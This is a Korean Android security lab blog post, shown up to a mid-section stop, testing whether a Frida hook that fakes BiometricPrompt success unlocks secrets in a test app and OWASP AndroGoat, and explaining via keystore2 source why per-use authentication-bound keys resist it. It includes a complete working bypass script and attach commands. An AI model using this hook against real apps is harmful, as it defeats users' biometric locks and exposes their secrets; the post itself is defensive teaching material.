---
layout: post
title: "Keystore와 BiometricPrompt — 콜백을 속여도 열리지 않는 키"
date: 2026-10-29 21:00:00 +0900
category: 블로그/기술문서
author: SeiKa
tags: [Android, AndroidSecurity, 모바일보안, Keystore, BiometricPrompt, CryptoObject, Frida, keystore2]
excerpt: "Frida로 지문 없이 onAuthenticationSucceeded를 불러 주자 boolean 게이트와 인증 없는 키의 CryptoObject는 비밀을 내줬고, 매번 인증 키만 doFinal에서 Key user not authenticated(-26)로 멈췄다. KeyMint가 소프트웨어인 에뮬레이터에서는 인증 없는 키가 루트로 디스크에서 그대로 읽혔다."
---

[지난 글](/posts/android-lab-p1c13-storage-log-clipboard-backup/)에서는 앱이 기기 안에 남기는 값을 누가 읽을 수 있는지 봤다. 이번에는 그 값을 지문 뒤에 숨기는 경우다. 은행 앱이든 메모 앱이든 "지문으로 잠금 해제"는 대개 `BiometricPrompt`를 띄우고 `onAuthenticationSucceeded`가 오면 다음 화면으로 넘어가는 식으로 만든다. 그 콜백을 공격자가 직접 불러 주면 무엇이 열리고 무엇이 안 열리는지, Keystore 키를 어떻게 만들었느냐에 따라 결과가 갈리는 모습을 에뮬레이터에서 확인했다.

실험 기기는 Android 13 에뮬레이터(API 33, google_apis x86_64, userdebug, 빌드 TE1A.240213.009, 보안 패치 2024-03-01)다. 잠금 화면 PIN을 걸고 에뮬레이터 지문을 하나 등록한 뒤 시작했다. 화면에 나오는 `$S`는 에뮬레이터 시리얼이고, Frida는 호스트와 기기 모두 17.17.0, 앱 쪽 androidx.biometric은 1.1.0을 썼으며 AOSP 소스 링크는 이 이미지에 맞춰 `android-13.0.0_r84` 태그로 걸었다. 선수 개념은 Atlas의 [Keystore·KeyMint·StrongBox](/posts/android-concept-atlas-c40-keystore-keymint-strongbox/)와 [Gatekeeper·생체 인증](/posts/android-concept-atlas-c41-gatekeeper-weaver-biometrics/), 후킹 기법은 [Frida 실습](/posts/android-lab-p1c08-frida-spawn-attach-java-hook/)에서 다뤘다.

## 비밀 하나를 여러 방식으로 잠근 실험 앱

공격 대상으로 `io.seika.biolab`라는 작은 앱을 만들었다. 문자열 `vault-token=seika-4417` 하나를 AES-256-GCM으로 암호화해 `shared_prefs/vault.xml`에 넣어 두고, 잠금 해제 방식만 바꿔 가며 같은 비밀을 꺼낸다. 키는 전부 `AndroidKeyStore`에 만든다.

| 해제 방식 | 쓰는 키 | 키 생성 옵션 | 프롬프트 |
|---|---|---|---|
| `bool` | `k_noauth` | 사용자 인증 없음 | CryptoObject 없이 띄우고, 성공 콜백에서 복호 |
| `crypto-noauth` | `k_noauth` | 사용자 인증 없음 | `k_noauth`로 초기화한 Cipher를 CryptoObject로 넘김 |
| `crypto-auth` | `k_auth` | 매번 인증, BIOMETRIC_STRONG | `k_auth`로 초기화한 Cipher를 CryptoObject로 넘김 |
| `timeout` | `k_timeout` | 인증 후 30초 유효, STRONG 또는 기기 자격 증명 | CryptoObject 없이 띄우고, 30초 안에 복호 |

키 생성과 잠금 해제 부분을 `MainActivity.java`에서 발췌해 줄였다. setup은 원래 모드별 switch 안에서 genKey를 부르고, timeout 분기는 주석 한 줄로 대신했다.

```java
void genKey(String alias, UnaryOperator<KeyGenParameterSpec.Builder> f) throws Exception {
    KeyGenParameterSpec.Builder b = new KeyGenParameterSpec.Builder(alias,
            KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .setKeySize(256);
    KeyGenerator g = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
    g.init(f.apply(b).build());
    g.generateKey();
}

// setup 단계
genKey(K_AUTH, b -> b.setUserAuthenticationRequired(true)
        .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG));
genKey(K_TIMEOUT, b -> b.setUserAuthenticationRequired(true)
        .setUserAuthenticationParameters(30, KeyProperties.AUTH_BIOMETRIC_STRONG | KeyProperties.AUTH_DEVICE_CREDENTIAL));

void unlock(String mode) throws Exception {
    switch (mode) {
        case "bool":
            log(req + ": prompt without CryptoObject (BIOMETRIC_STRONG)");
            ask(info(false), null, r -> decryptFresh(K_NOAUTH));
            break;
        case "crypto-noauth":
        case "crypto-auth": {
            String alias = mode.equals("crypto-auth") ? K_AUTH : K_NOAUTH;
            Cipher c = decCipher(alias);
            log(req + ": cipher.init(DECRYPT, " + alias + ") ok, prompt with CryptoObject");
            ask(info(false), new BiometricPrompt.CryptoObject(c), r -> {
                try {
                    byte[] p = r.getCryptoObject().getCipher().doFinal(ct(alias));
                    log(req + ": UNLOCKED " + new String(p, StandardCharsets.UTF_8));
                } catch (Throwable t) { logEx(req + ": doFinal FAILED ", t); }
            });
            break;
        }
        // timeout: ask(info(true), null, r -> decryptFresh(K_TIMEOUT));
    }
}
```

`ask()`는 CryptoObject가 있으면 `prompt.authenticate(info, crypto)`, 없으면 `prompt.authenticate(info)`를 부른다. 명령은 `am start -n io.seika.biolab/.MainActivity --es cmd unlock --es mode <방식>`으로 넣고, 결과는 logcat 태그 `BIOLAB`에 찍힌다. 예외가 나면 cause 체인을 끝까지 따라가고, `KeyStoreException`이면 `getNumericErrorCode()` 값까지 붙여 찍게 해서 바깥 예외 이름만 보고 추측하지 않아도 되게 했다.

암호문은 `--es cmd setup --es mode <방식>`으로 만들었다. `noauth`는 프롬프트 없이 바로 봉인하고, `auth`와 `timeout`은 정상 경로대로 프롬프트를 띄운 뒤 `adb emu finger touch 1`로 에뮬레이터 지문을 한 번씩 대서 봉인했다. 매번 인증 키 `k_auth`로 암호화한 값이 존재하는 것도 이 실제 인증 덕분이다.

비교 대상으로 OWASP AndroGoat의 생체 인증 화면도 같이 봤다. apktool로 두 APK를 풀어 각 앱 코드가 어느 `authenticate` 오버로드를 부르는지 grep하면 차이가 바로 보인다.

![apktool로 androgoat.apk와 biolab.apk를 풀고 grep한 결과. AndroGoat BioMetricAuthActivity.smali 182행은 authenticate(PromptInfo)만 부르고, BioLab MainActivity.smali 809행은 PromptInfo, 817행은 PromptInfo와 CryptoObject를 넘긴다. setUserAuthentication 호출은 AndroGoat 0건, BioLab에만 있다](/assets/img/android-mastery/p1c14/00-static-triage.png)

AndroGoat는 CryptoObject 없이 `authenticate(PromptInfo)`만 부르고, 키에 사용자 인증을 거는 `setUserAuthenticationRequired`나 `setUserAuthenticationParameters`가 코드 어디에도 없다. 성공 콜백이 하는 일은 다이얼로그 하나를 띄우는 것이고, 그 뒤에 지키는 자원이 없다. 그래서 비밀이 실제로 걸려 있는 BioLab을 주 실험 대상으로 삼았다.

## 이 에뮬레이터의 Keystore는 소프트웨어다

시작하기 전에 기기가 어떤 키를 만들 수 있는지부터 확인했다. `info`는 SDK, 잠금 화면 설정 여부, StrongBox 기능 플래그, `BiometricManager.canAuthenticate()` 결과를 찍고, `gentest`는 매번 인증 키, 30초 키, `setIsStrongBoxBacked(true)` 키를 차례로 만들어 본다.

![adb로 biolab의 info와 gentest를 실행한 logcat. sdk=33 deviceSecure=true strongbox=false, canAuthenticate STRONG=SUCCESS WEAK=SUCCESS STRONG+CREDENTIAL 조합도 SUCCESS, t_peruse와 t_30s는 generated, t_strongbox는 StrongBoxUnavailableException이고 cause는 KeyStoreException No StrongBox available numericErrorCode=12](/assets/img/android-mastery/p1c14/01-env-keys.png)

인증이 걸린 키는 둘 다 만들어졌고 StrongBox 키는 `StrongBoxUnavailableException`으로 거절됐다. 원인은 `No StrongBox available [numericErrorCode=12]`다. 이 이미지의 KeyMint는 AOSP 기본 구현이고 [`service.cpp` 52행](https://android.googlesource.com/platform/hardware/interfaces/+/refs/tags/android-13.0.0_r84/security/keymint/aidl/default/service.cpp#52)에서 `SecurityLevel::SOFTWARE`로 등록된다. 실제로 뒤에서 찍은 모든 키의 `KeyInfo`가 `securityLevel=SOFTWARE insideSecureHardware=false`였다. 따라서 아래에서 보는 Keystore 동작은 전부 keystore2와 소프트웨어 KeyMint의 동작이다. 실기기의 TEE나 StrongBox가 키를 어떻게 다루는지는 이 환경에서 측정하지 못했다.

지문 쪽은 다르다. goldfish 프레임워크 오버레이가 지문 센서를 `0:2:15`(Strong)로 등록하고([`config.xml` 54행](https://android.googlesource.com/device/generic/goldfish/+/refs/tags/android-13.0.0_r84/overlay/frameworks/base/core/res/res/values/config.xml#54)), goldfish 지문 HAL은 인증 성공 메시지의 HAT에 요청된 operation challenge와 authenticator ID를 담는다([`fingerprint.c` 599행](https://android.googlesource.com/device/generic/goldfish/+/refs/tags/android-13.0.0_r84/fingerprint/fingerprint.c#599)). 그러니 challenge가 토큰에 실려 keystore2까지 가는 프레임워크 경로는 실기기와 같다. 인증 흐름에서 소프트웨어 KeyMint는 인증 토큰(HAT)의 MAC을 검사하지 않고(`ValidateTokenSignature`가 항상 true, [`soft_keymaster_enforcement.h` 39행](https://android.googlesource.com/platform/system/keymaster/+/refs/tags/android-13.0.0_r84/include/keymaster/km_openssl/soft_keymaster_enforcement.h#39)), 토큰 만료도 스스로 따지지 않는다(`auth_token_timed_out`이 항상 false, [33~36행](https://android.googlesource.com/platform/system/keymaster/+/refs/tags/android-13.0.0_r84/include/keymaster/km_openssl/soft_keymaster_enforcement.h#33)). 그래서 이 기기에서 토큰의 MAC을 확인하는 곳은 없고 만료는 keystore2만 따진다. challenge와 SID가 키와 맞는지는 소프트웨어 KeyMint도 본다([keymaster_enforcement.cpp 494~501행](https://android.googlesource.com/platform/system/keymaster/+/refs/tags/android-13.0.0_r84/android_keymaster/keymaster_enforcement.cpp#494)). 키 재료가 디스크에 소프트웨어 블롭으로 놓인다는 차이는 뒤의 keystore2 데이터베이스 절에서 따로 본다. 앱 프로세스 안에서 토큰을 위조해 keystore2에 넣는 시도는 이번에 하지 않았다.

지문은 키를 만들기 전에 등록해야 했다. `KeyGenParameterSpec.Builder`의 `setInvalidatedByBiometricEnrollment` 기본값이 true라서, 키를 만든 뒤 지문을 새로 등록하면 생체 전용 키는 영구히 무효가 된다. 실측한 `KeyInfo`를 보면 생체 전용인 `k_auth`만 `invalidatedByBiometricEnrollment=true`였고, 기기 자격 증명도 허용한 `k_timeout`은 false였다. `KeyInfo`의 이 값은 인증 타입이 생체 전용이고 SID 목록에 root SID가 없을 때만 true로 계산된다([AndroidKeyStoreSecretKeyFactorySpi.java 233~238행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/keystore2/AndroidKeyStoreSecretKeyFactorySpi.java#233)). 자격 증명을 허용한 `k_timeout`은 아래 `addSids`에서 보듯 root SID에 묶이므로 false다. 셋업을 새로 부팅한 기기에서 다시 돌려 찍은 화면에 세 키의 `KeyInfo`가 다 나온다.

![biolab setup noauth, auth, timeout을 차례로 실행하고 auth와 timeout 뒤에 adb emu finger touch 1을 보낸 터미널. 세 키 모두 getEncoded()=null getFormat()=null securityLevel=SOFTWARE, k_auth는 timeout=0 authType=BIOMETRIC_STRONG invalidatedByBiometricEnrollment=true, k_timeout은 timeout=30 authType이 BIOMETRIC_STRONG과 DEVICE_CREDENTIAL 조합이고 invalidatedByBiometricEnrollment=false, 각 키 stored iv=12 B ct=38 B, 마지막 grep addAuthToken에 AuthenticationClient: Skipping addAuthToken과 AuthSession: addAuthToken: 0이 두 쌍](/assets/img/android-mastery/p1c14/02b-setup.png)

실제 지문을 두 번 댔으니 `addAuthToken`이 들어간 줄도 두 쌍 남았다.

## boolean 게이트는 콜백 한 번에 열린다

후킹 스크립트 `bypass.js`는 androidx `BiometricPrompt`의 두 `authenticate` 오버로드를 갈아 끼운다. 프롬프트를 띄우지 않고, 앱이 등록한 콜백의 `onAuthenticationSucceeded`를 메인 스레드에서 직접 부른다. CryptoObject 오버로드에서는 앱이 넘긴 CryptoObject를 그대로 돌려주므로, 앱은 자기가 init한 Cipher를 콜백에서 다시 받는다.

```javascript
// bypass.js - answer androidx.biometric BiometricPrompt.authenticate() with
// onAuthenticationSucceeded() without showing a prompt or touching a sensor.
// Works on apps that bundle androidx.biometric 1.1.x without obfuscating it.
Java.perform(function () {
  const BP = Java.use('androidx.biometric.BiometricPrompt');
  const VM = Java.use('androidx.biometric.BiometricViewModel');
  const Result = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
  let callback = null;

  // every BiometricPrompt constructor hands the app's callback to the view model
  VM.setClientCallback.implementation = function (cb) {
    callback = Java.retain(cb);
    console.log('[hook] app callback: ' + cb.$className);
    return this.setClientCallback(cb);
  };

  // attached after the prompt object was built: read the callback out of the live view model
  function appCallback() {
    if (callback === null) {
      Java.choose('androidx.biometric.BiometricViewModel', {
        onMatch: function (vm) { callback = Java.retain(vm.getClientCallback()); return 'stop'; },
        onComplete: function () {}
      });
      console.log('[hook] app callback (from view model): ' + callback.$className);
    }
    return callback;
  }

  function succeed(crypto) {
    Java.scheduleOnMainThread(function () {
      console.log('[hook] -> onAuthenticationSucceeded(crypto=' + (crypto === null ? 'null' : 'the app\'s own CryptoObject') + ')');
      appCallback().onAuthenticationSucceeded(Result.$new(crypto, 2)); // 2 = AUTHENTICATION_RESULT_TYPE_BIOMETRIC
    });
  }

  BP.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function (info) {
    console.log('[hook] authenticate(PromptInfo) "' + info.getSubtitle() + '": prompt suppressed');
    succeed(null);
  };

  BP.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo',
                           'androidx.biometric.BiometricPrompt$CryptoObject').implementation = function (info, crypto) {
    console.log('[hook] authenticate(PromptInfo, CryptoObject) "' + info.getSubtitle() + '": prompt suppressed');
    succeed(Java.retain(crypto));
  };

  console.log('[hook] installed');
});
```

흔히 보는 우회 예제는 추상 클래스 `AuthenticationCallback.onAuthenticationSucceeded`를 후킹하는데, 그 훅은 라이브러리가 앱을 부르는 순간에 걸리므로 콜백을 새로 일으키지는 못한다. 콜백이 오게 하려면 프롬프트를 띄우는 쪽(`authenticate`)을 막고 앱 콜백 객체를 손에 넣어야 한다. androidx 1.1.0은 생성자에서 앱 콜백을 `BiometricViewModel.setClientCallback`으로 넘기니 거기서 잡고, 이미 만들어진 뒤라면 살아 있는 뷰 모델을 `Java.choose`로 찾아 `getClientCallback()`으로 꺼낸다.

처음에는 `frida -D $S -f io.seika.biolab -l bypass.js` 처럼 spawn 모드로 띄웠다. `[hook] installed`까지 찍혔는데 정작 `authenticate` 대체 함수는 불리지 않았고, 실제 시스템 생체 인증 시트가 떴다. logcat에도 SystemUI가 다이얼로그를 만들고 지문 서비스가 `io.seika.biolab`의 인증을 요청하는 줄이 남았다. spawn 상태에서 Frida의 클래스 로더, `BiometricPrompt` 클래스의 로더, 액티비티의 로더가 모두 같은 base.apk의 PathClassLoader인 것까지 확인했지만, 그런데도 훅이 안 걸린 이유는 찾지 못했다. 앱을 먼저 띄우고 pid로 attach하자 바로 동작했다. 이때는 프롬프트 객체가 이미 `onCreate`에서 만들어졌으므로 `setClientCallback` 훅은 불리지 않고 `Java.choose` 쪽으로 콜백을 찾는다. 아래 출력의 `(from view model)`이 그 흔적이다.

![frida -D $S -p $PID -l bypass.js로 attach한 뒤 unlock bool을 실행한 터미널. hook 로그 authenticate(PromptInfo) "unlock bool": prompt suppressed, onAuthenticationSucceeded(crypto=null), 앱 로그는 unlock bool: UNLOCKED vault-token=seika-4417, logcat에서 grep -c addAuthToken 결과는 0](/assets/img/android-mastery/p1c14/02-bypass-bool.png)

캡처에는 보이지 않지만 실행 직전마다 `adb -s $S shell am force-stop io.seika.biolab`로 앱을 내리고 `adb -s $S logcat -c`로 로그를 비웠다. 셋업 때 실제로 댄 지문이 `addAuthToken` 줄을 이미 남겨 두었기 때문이다. 지문을 대지 않았는데 앱은 `onAuthenticationSucceeded type=2 crypto=null`을 받고 `k_noauth`로 비밀을 복호해 `UNLOCKED vault-token=seika-4417`을 찍었다. 이 설계에서 지문은 `if`문 하나를 통과시키는 역할만 하고, 그 `if`를 판정하는 코드가 공격자가 고칠 수 있는 프로세스 안에 있다. 마지막 줄의 `grep -c addAuthToken` 결과 0은 이번 실행 동안 시스템 생체 인증 서비스가 Keystore에 인증 토큰을 넣는 경로가 한 번도 돌지 않았다는 표시다.

AndroGoat에도 같은 스크립트를 붙였다. "BIOMETRIC AUTHENTICATION" 버튼을 누르자 `authenticate(PromptInfo) "Log in using your biometric credential": prompt suppressed`가 찍혔고, 콜백은 `owasp.sat.agoat.BioMetricAuthActivity$onCreate$1`로 잡혔다.

![adb로 owasp.sat.agoat/.BioMetricAuthActivity를 띄우고 pid 7162에 frida -D $S -p $PID -l bypass.js로 attach한 터미널. 5초 뒤 input tap 540 673으로 버튼을 누르자 hook 로그 authenticate(PromptInfo) "Log in using your biometric credential": prompt suppressed, onAuthenticationSucceeded(crypto=null), app callback (from view model): owasp.sat.agoat.BioMetricAuthActivity$onCreate$1, logcat grep -c addAuthToken 결과 0](/assets/img/android-mastery/p1c14/07-androgoat.png)

![AndroGoat 생체 인증 화면에 Biometric login, Authentication succeeded! 다이얼로그와 OK 버튼이 떠 있고 시스템 지문 인증 시트는 보이지 않는 에뮬레이터 화면](/assets/img/android-mastery/p1c14/07b-androgoat-screen.png)

시스템 지문 시트는 한 번도 뜨지 않았고 화면에는 성공 다이얼로그만 남았다. 디컴파일한 AndroGoat에서 `BIOMETRIC_WEAK`(0xff)는 `canAuthenticate()`로 기기 지원 여부를 묻는 데만 쓰이고, `PromptInfo.Builder`에는 제목, 부제, 취소 버튼 문구만 넣고 `setAllowedAuthenticators`는 부르지 않는다. androidx 1.1.0의 `BiometricPrompt.authenticate(info, crypto)`는 허용 인증기에 Class 2(Weak)가 들어 있으면 "Crypto-based authentication is not supported for Class 2 (Weak) biometrics."라는 `IllegalArgumentException`을 던진다([biometric-1.1.0 소스 jar](https://dl.google.com/android/maven2/androidx/biometric/biometric/1.1.0/biometric-1.1.0-sources.jar)의 `BiometricPrompt.java` 944~951행). 허용 인증기를 따로 지정하지 않고 CryptoObject를 넘기면 같은 jar의 `AuthenticatorUtils.java` 79~86행에 있는 `getConsolidatedAuthenticators`가 BIOMETRIC_STRONG으로 채운다. 그러니 AndroGoat에 CryptoObject를 붙여도 이 예외는 나지 않는다.

이 앱을 고치려면 인증에 묶인 키(`setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)`)를 만들어 그 키의 Cipher를 CryptoObject로 넘겨야 하고, `canAuthenticate` 검사도 BIOMETRIC_STRONG으로 바꿔야 약한 센서만 있는 기기를 쓸 수 있다고 잘못 판정하지 않는다. 시스템 서비스 쪽도 약한 센서의 토큰은 "Dropping authToken for non-strong biometric"을 남기고 버린다([`AuthSession.java` 578행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/biometrics/AuthSession.java#578)). 이 두 제약은 소스로 확인했고 기기에서 따로 재현하지는 않았다.

## 같은 후킹을 CryptoObject 두 설계에 걸었을 때

이번에는 CryptoObject를 쓰는 두 방식을 같은 훅 아래에서 연달아 실행했다. 둘 다 프롬프트 직전에 `cipher.init(DECRYPT, ...)`를 하고, 콜백에서 돌려받은 Cipher로 `doFinal`을 부른다. 두 방식은 키만 다르다.

![같은 bypass.js로 unlock crypto-noauth와 unlock crypto-auth를 연달아 실행한 터미널. crypto-noauth는 UNLOCKED vault-token=seika-4417, crypto-auth는 cipher.init ok 뒤 doFinal FAILED javax.crypto.IllegalBlockSizeException, cause KeyStoreException Key user not authenticated internal Keystore code -26, In get_auth_tokens: No operation auth token received, numericErrorCode=2, addAuthToken 카운트 0](/assets/img/android-mastery/p1c14/03-bypass-crypto.png)

출력을 옮기면 이렇다.

```
unlock crypto-noauth: cipher.init(DECRYPT, k_noauth) ok, prompt with CryptoObject
unlock crypto-noauth: onAuthenticationSucceeded type=2 crypto=CryptoObject
unlock crypto-noauth: UNLOCKED vault-token=seika-4417
== unlock crypto-auth
unlock crypto-auth: cipher.init(DECRYPT, k_auth) ok, prompt with CryptoObject
unlock crypto-auth: onAuthenticationSucceeded type=2 crypto=CryptoObject
unlock crypto-auth: doFinal FAILED javax.crypto.IllegalBlockSizeException
  cause: android.security.KeyStoreException: Key user not authenticated (internal Keystore code: -26 message: In KeystoreOperation::update
Caused by:
    0: In update: Trying to get auth tokens.
    1: In AuthInfo::get_auth_tokens.
    2: In get_auth_tokens: No operation auth token received.
    3: Error::Km(ErrorCode(-26))) [numericErrorCode=2]
```

`crypto-noauth`는 CryptoObject를 썼는데도 그냥 열렸다. Cipher를 CryptoObject로 감싼다고 보호가 생기지는 않는다. 그 Cipher의 키가 인증을 요구하지 않으면 keystore2는 아무것도 기다리지 않는다. 막힌 것은 매번 인증을 요구하는 `k_auth` 하나였다. 바깥 예외는 `IllegalBlockSizeException`인데 이 이름 자체는 정보가 없다. `AndroidKeyStoreCipherSpiBase.engineDoFinal`이 keystore 오류 코드 가운데 `INVALID_ARGUMENT`와 `VERIFICATION_FAILED`가 아닌 것을 전부 이 타입으로 감싸기 때문이다([604~614행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/keystore2/AndroidKeyStoreCipherSpiBase.java#604)). 읽어야 할 것은 cause다. KeyMint 오류 -26(`KEY_USER_NOT_AUTHENTICATED`)이고, 자바 쪽 숫자 코드 2는 `KeyStoreException.ERROR_USER_AUTHENTICATION_REQUIRED`다([54행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/KeyStoreException.java#54)).

실패 지점도 예상과 달랐다. 소스만 보고는 GCM 복호의 마지막 `finish`에서 터질 거라고 봤는데, 체인은 `KeystoreOperation::update`에서 시작한다. `doFinal`이 내부에서 남은 입력을 먼저 `update`로 흘려 보내고, keystore2는 그 첫 `update`에서 이 operation에 붙을 인증 토큰을 찾는다. 찾는 함수가 [`enforcements.rs` 91~98행의 `get_auth_tokens`](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/enforcements.rs#91)이고, 토큰이 없으면 바로 그 "No operation auth token received" 문맥을 붙여 `KEY_USER_NOT_AUTHENTICATED`를 돌려준다. 같은 시각 기기 logcat에도 `E keystore2: ... In get_auth_tokens: No operation auth token received. ... Error::Km(ErrorCode(-26))`가 남았다.

그러면 keystore2는 무엇을 보고 이 키에 토큰이 필요하다고 판단했을까. 키를 만들 때 프레임워크가 `setUserAuthenticationRequired(true)`를 KeyMint 태그로 바꾸는 코드가 [`KeyStore2ParameterUtils.addSids`](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/keystore2/KeyStore2ParameterUtils.java#240)다.

![KeyStore2ParameterUtils.java 234~280행. addSids는 인증 타입이 BIOMETRIC_STRONG과 DEVICE_CREDENTIAL 조합이면 KM_TAG_USER_SECURE_ID에 gatekeeper root SID를 넣고, 생체만이고 setInvalidatedByBiometricEnrollment가 true(기본값)이면 BiometricManager.getAuthenticatorIds()로 얻은 SID들을 넣으며, 등록된 생체가 없으면 At least one biometric must be enrolled 예외를 던진다](/assets/img/android-mastery/p1c14/21-src-addsids.png)

키에는 `KM_TAG_USER_SECURE_ID`(지문 authenticator ID 또는 잠금 화면 root SID)와 `KM_TAG_USER_AUTH_TYPE`이 붙고, 타임아웃이 0보다 크면 `KM_TAG_AUTH_TIMEOUT`도 붙는다. keystore2의 `authorize_create`는 SID가 있고 타임아웃이 없으면 per-op 키로 본다([622~624행](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/enforcements.rs#622)). per-op 키는 operation을 시작할 때는 막지 않고 challenge를 하나 내준다. 그래서 `cipher.init`은 통과한다. 프레임워크는 그 값을 [`getOrMakeOperationChallenge`](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/keystore2/KeyStoreCryptoOperationUtils.java#206)로 꺼내 CryptoObject의 opId로 쓴다. 생체 인증이 진짜로 성공하면 지문 HAL이 이 challenge를 담은 인증 토큰을 만들고, 그 토큰이 keystore2에 들어가야 같은 challenge를 가진 operation이 끝까지 간다. Frida가 부른 콜백은 앱 프로세스 안에서 자바 메서드를 호출한 것이라 지문 HAL이 만드는 이 토큰과는 무관하다.

## 진짜 지문을 대면 토큰이 어디로 가는가

실패가 설계 때문인지 확인하려고 훅 없이 같은 `crypto-auth`를 실행하고 `adb emu finger touch 1`로 등록한 지문을 댔다.

![Frida 없이 unlock crypto-auth를 실행하고 adb -s $S emu finger touch 1로 지문을 댄 터미널. 앱 로그는 cipher.init ok, onAuthenticationSucceeded type=2 crypto=CryptoObject, UNLOCKED vault-token=seika-4417이고, logcat에 Biometrics/AuthenticationClient: Skipping addAuthToken과 BiometricService/AuthSession: addAuthToken: 0 두 줄이 있다](/assets/img/android-mastery/p1c14/03c-real.png)

같은 키, 같은 코드가 이번에는 열렸다. logcat에는 `addAuthToken`이 들어간 줄이 두 개 생겼다. `AuthenticationClient`의 `Skipping addAuthToken`은 센서 클라이언트가 토큰 전달을 직접 하지 않고 세션에 미룬다는 뜻이다([`AuthenticationClient.java` 246~251행](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/services/core/java/com/android/server/biometrics/sensors/AuthenticationClient.java#246)). 실제로 토큰을 넣는 곳은 `AuthSession`이다.

![AuthSession.java 744~765행 onDialogDismissed. DISMISSED_REASON_BIOMETRIC_CONFIRMED와 BIOMETRIC_CONFIRM_NOT_REQUIRED 경우에 mTokenEscrow가 있으면 mKeyStore.addAuthToken(mTokenEscrow)를 부르고 Slog.d로 addAuthToken: 결과값을 남긴 뒤 onAuthenticationSucceeded를 전달한다](/assets/img/android-mastery/p1c14/25-src-authsession.png)

시스템 다이얼로그가 생체 확인으로 닫혀야 `mKeyStore.addAuthToken(mTokenEscrow)`가 불리고, 로그의 `addAuthToken: 0`에서 0은 횟수가 아니라 그 호출의 반환값이다. 앱의 `onAuthenticationSucceeded`는 그다음에야 전달된다. 토큰이 먼저 keystore2에 들어가고 콜백이 나중에 오는 순서라서, 콜백만 위조하면 그 앞 단계가 통째로 빠진다. 앞의 두 우회 실행에서 `grep -c addAuthToken`이 0이었던 건 이 두 줄이 하나도 찍히지 않았기 때문이다. Frida로 위조한 해제는 어느 것도 `AuthSession`의 `addAuthToken`을 만들지 않았다.

## 매번 인증 키와 30초 창, 그리고 getEncoded()

프롬프트도 Frida도 없이 각 키에 지금 무엇이 허용되는지 묻는 `probe`를 마지막 실제 인증에서 몇 분 지난 뒤 돌렸다. 키마다 `getEncoded()`와 `KeyInfo`를 찍고, `cipher.init`과 `doFinal`을 따로 시도해 어디서 막히는지 나눠 본다.

![probe 실행 결과. 세 키 모두 AndroidKeyStoreSecretKey getEncoded()=null getFormat()=null securityLevel=SOFTWARE insideSecureHardware=false. k_noauth는 doFinal ok vault-token=seika-4417, k_auth는 cipher.init ok 뒤 doFinal FAILED IllegalBlockSizeException Key user not authenticated -26, k_timeout은 cipher.init FAILED android.security.keystore.UserNotAuthenticatedException: User not authenticated](/assets/img/android-mastery/p1c14/04-probe-keys.png)

두 인증 키가 막히는 자리가 다르다. 매번 인증 키 `k_auth`는 앞에서와 똑같이 `init`은 되고 `doFinal`에서 -26으로 멈춘다. 30초 키 `k_timeout`은 `cipher.init`에서 바로 `UserNotAuthenticatedException: User not authenticated`가 났고 cause 체인은 없었다. 타임아웃 키는 operation을 시작할 때 keystore2가 "최근 30초 안에 이 키의 SID를 만족한 토큰"을 찾고, 오래됐으면 그 자리에서 거절한다. 이 probe는 실제 지문 인증 몇 분 뒤에 돌렸으므로 그 토큰은 아직 keystore2에 남아 있었고, 뒤의 30초 창 실험에서 보듯 지문 토큰은 이 키의 SID와 맞는다. 그렇다면 `authorize_create`는 SID와 인증 타입이 맞는 가장 최근 토큰을 찾은 뒤, 그 토큰이 30초보다 오래됐다고 "matching auth token is expired"로 거절했을 것이다([`enforcements.rs` 659~661행](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/enforcements.rs#659)). 맞는 토큰이 아예 없을 때는 [639행](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/enforcements.rs#639)의 "No suitable auth token found" 분기를 탄다. 이 probe 때의 keystore2 로그는 따로 받아 두지 않아서, 어느 분기였는지는 소스로 읽은 추론이다.

`getEncoded()=null getFormat()=null`은 세 키 모두 같았다. 인증 없는 키도 null이다. [`AndroidKeyStoreKey`](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/keystore/java/android/security/keystore2/AndroidKeyStoreKey.java#94)가 "This key does not export its key material"이라는 주석과 함께 두 메서드에서 무조건 null을 돌려주기 때문이다. 이 값으로 알 수 있는 건 자바 API 객체가 원본을 들고 있지 않다는 것까지다. 키 바이트가 하드웨어 안에 있다는 증거는 되지 못한다. 키가 실제로 어디 있는지는 `securityLevel`이 말해 주고, 여기서는 SOFTWARE였다.

30초 창이 어떻게 쓰이는지도 봤다. `timeout` 방식으로 실제 지문을 한 번 대서 열고, 몇 초 뒤 같은 `probe`를 돌렸다.

![unlock timeout을 실제 지문으로 연 직후의 probe. unlock timeout: UNLOCKED vault-token=seika-4417 다음에 k_noauth doFinal ok, k_auth는 여전히 doFinal FAILED Key user not authenticated -26, k_timeout은 cipher.init ok와 doFinal ok vault-token=seika-4417](/assets/img/android-mastery/p1c14/05b-window.png)

